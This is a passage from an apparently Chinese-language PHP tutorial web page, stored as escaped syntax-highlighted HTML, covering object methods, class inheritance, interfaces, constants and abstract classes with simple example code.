&lt;span class=&#34;token variable&#34;&gt;$google&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;setUrl&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt; &lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;www.google.com&#39;&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;

&lt;span class=&#34;token comment&#34;&gt;// 调用成员函数，获取标题和URL&lt;/span&gt;
&lt;span class=&#34;token variable&#34;&gt;$runoob&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;getTitle&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token variable&#34;&gt;$taobao&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;getTitle&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token variable&#34;&gt;$google&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;getTitle&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;

&lt;span class=&#34;token variable&#34;&gt;$runoob&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;getUrl&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token variable&#34;&gt;$taobao&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;getUrl&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token variable&#34;&gt;$google&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;getUrl&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;

&lt;span class=&#34;token comment&#34;&gt;// 子类扩展站点类别&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;token class-name-definition class-name&#34;&gt;Child_Site&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;extends&lt;/span&gt; &lt;span class=&#34;token class-name&#34;&gt;Site&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;{&lt;/span&gt;
    &lt;span class=&#34;token keyword&#34;&gt;var&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$category&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;

    &lt;span class=&#34;token keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;token function-definition function&#34;&gt;setCate&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$par&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;{&lt;/span&gt;
        &lt;span class=&#34;token variable&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;token property&#34;&gt;category&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$par&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
    &lt;span class=&#34;token punctuation&#34;&gt;}&lt;/span&gt;

    &lt;span class=&#34;token keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;token function-definition function&#34;&gt;getCate&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;{&lt;/span&gt;
        &lt;span class=&#34;token keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;token property&#34;&gt;category&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;.&lt;/span&gt; &lt;span class=&#34;token constant&#34;&gt;PHP_EOL&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
    &lt;span class=&#34;token punctuation&#34;&gt;}&lt;/span&gt;
&lt;span class=&#34;token punctuation&#34;&gt;}&lt;/span&gt;

&lt;span class=&#34;token comment&#34;&gt;// 声明一个&#39;iTemplate&#39;接口&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;interface&lt;/span&gt; &lt;span class=&#34;token class-name-definition class-name&#34;&gt;iTemplate&lt;/span&gt;
&lt;span class=&#34;token punctuation&#34;&gt;{&lt;/span&gt;
    &lt;span class=&#34;token keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;token function-definition function&#34;&gt;setVariable&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$name&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$var&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
    &lt;span class=&#34;token keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;token function-definition function&#34;&gt;getHtml&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$template&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token punctuation&#34;&gt;}&lt;/span&gt;


&lt;span class=&#34;token comment&#34;&gt;// 实现接口&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;token class-name-definition class-name&#34;&gt;Template&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;implements&lt;/span&gt; &lt;span class=&#34;token class-name&#34;&gt;iTemplate&lt;/span&gt;
&lt;span class=&#34;token punctuation&#34;&gt;{&lt;/span&gt;
    &lt;span class=&#34;token keyword&#34;&gt;private&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$vars&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;array&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;

    &lt;span class=&#34;token keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;token function-definition function&#34;&gt;setVariable&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$name&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$var&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
    &lt;span class=&#34;token punctuation&#34;&gt;{&lt;/span&gt;
        &lt;span class=&#34;token variable&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;token property&#34;&gt;vars&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$name&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$var&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
    &lt;span class=&#34;token punctuation&#34;&gt;}&lt;/span&gt;

    &lt;span class=&#34;token keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;token function-definition function&#34;&gt;getHtml&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$template&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
    &lt;span class=&#34;token punctuation&#34;&gt;{&lt;/span&gt;
        &lt;span class=&#34;token keyword&#34;&gt;foreach&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;token property&#34;&gt;vars&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;as&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$name&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$value&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;{&lt;/span&gt;
            &lt;span class=&#34;token variable&#34;&gt;$template&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;str_replace&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;{&#39;&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;.&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$name&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;.&lt;/span&gt; &lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;}&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$value&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$template&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
        &lt;span class=&#34;token punctuation&#34;&gt;}&lt;/span&gt;

        &lt;span class=&#34;token keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$template&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
    &lt;span class=&#34;token punctuation&#34;&gt;}&lt;/span&gt;
&lt;span class=&#34;token punctuation&#34;&gt;}&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;const&lt;/span&gt; &lt;span class=&#34;token constant&#34;&gt;constant&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;常量值&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;//如果父类中的方法被声明为 final，则子类无法覆盖该方法。如果一个类被声明为 final，则不能被继承。&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;abstract&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;token class-name-definition class-name&#34;&gt;AbstractClass&lt;/span&gt;
&lt;span class=&#34;token punctuation&#34;&gt;{&lt;/span&gt;
    &lt;span class=&#34;token comment&#34;&gt;// 强制要求子类定义这些方法&lt;/span&gt;
    &lt;span class=&#34;token keyword&#34;&gt;abstract&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;protected&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;token function-definition function&#34;&gt;getValue&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
    &lt;span class=&#34;token keyword&#34;&gt;abstract&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;protected&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;token function-definition function&#34;&gt;prefixValue&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$prefix&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;

    &lt;span class=&#34;token comment&#34;&gt;// 普通方法（非抽象方法）&lt;/span&gt;
    &lt;span class=&#34;token keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;token function-definition function&#34;&gt;printOut&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;{&lt;/span&gt;
        &lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;getValue&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;.&lt;/span&gt; &lt;span class=&#34;token constant&#34;&gt;PHP_EOL&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
    &lt;span class=&#34;token punctuation&#34;&gt;}&lt;/span&gt;
&lt;span class=&#34;token punctuation&#34;&gt;}&lt;/span&gt;

&lt;span class=&#34;token keyword&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;token class-name-definition class-name&#34;&gt;ConcreteClass1&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;extends&lt;/span&gt; &lt;span class=&#34;token class-name&#34;&gt;AbstractClass&lt;/span&gt;
&lt;span class=&#34;token punctuation&#34;&gt;{&lt;/span&gt;
    &lt;span class=&#34;token keyword&#34;&gt;protected&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;token function-definition function&#34;&gt;getValue&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;{&lt;/span&gt;
        &lt;span class=&#34;token keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;ConcreteClass1&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
    &lt;span class=&#34;token punctuation&#34;&gt;}&lt;/span&gt;

    &lt;span class=&#34;token keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;token function-definition function&#34;&gt;prefixValue&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$prefix&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;{&lt;/span&gt;
        &lt;span class=&#34;token keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;&lt;span class=&#34;token interpolation&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$prefix&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;}&lt;/span&gt;&lt;/span&gt;ConcreteClass1&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
    &lt;span class=&#34;token punctuation&#34;&gt;}&lt;/span&gt;
&lt;span class=&#34;token punctuation&#34;&gt;}&lt;/span&gt;

&lt;span class=&#34;token keyword&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;token class-name-definition class-name&#34;&gt;ConcreteClass2&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;extends&lt;/span&gt; &lt;span class=&#34;token class-name&#34;&gt;AbstractClass&lt;/span&gt;
&lt;span class=&#34;token punctuation&#34;&gt;{&lt;/span&gt;
    &lt;span class=&#34;token keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;token function-definition function&#34;&gt;getValue&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;{&lt;/span&gt;
        &lt;span class=&#34;token keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;ConcreteClass2&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
    &lt;span class=&#34;token punctuation&#34;&gt;}&lt;/span&gt;

    &lt;span class=&#34;token keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;token function-definition function&#34;&gt;prefixValue&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$prefix&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;{&lt;/span&gt;
        &lt;span class=&#34;token keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;&lt;span class=&#34;token interpolation&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$prefix&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;}&lt;/span&gt;&lt;/span&gt;ConcreteClass2&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
    &lt;span class=&#34;token punctuation&#34;&gt;}&lt;/span&gt;
&lt;span class=&#34;token punctuation&#34;&gt;}&lt;/span&gt;

&lt;span class=&#34;token variable&#34;&gt;$class1&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;token class-name&#34;&gt;ConcreteClass1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token variable&#34;&gt;$class1&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;printOut&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$class1&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;prefixValue&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;FOO_&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;.&lt;/span&gt; &lt;span class=&#34;token constant&#34;&gt;PHP_EOL&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;

&lt;span class=&#34;token variable&#34;&gt;$class2&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;token class-name&#34;&gt;ConcreteClass2&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token variable&#34;&gt;$class2&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;printOut&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$class2&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;prefixValue&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;FOO_&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;.&lt;/span&gt; &lt;span class=&#34;token constant&#34;&gt;PHP_EOL&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token delimiter important&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;/span&gt;
?&amp;gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;表单&#34;&gt;&lt;a href=&#34;#表单&#34; class=&#34;headerlink&#34; title=&#34;表单&#34;&gt;&lt;/a&gt;表单&lt;/h3&gt;&lt;pre class=&#34;line-numbers language-php&#34; data-language=&#34;php&#34;&gt;&lt;code class=&#34;language-php&#34;&gt;&lt;span class=&#34;token php language-php&#34;&gt;&lt;span class=&#34;token delimiter important&#34;&gt;&amp;lt;?php&lt;/span&gt;
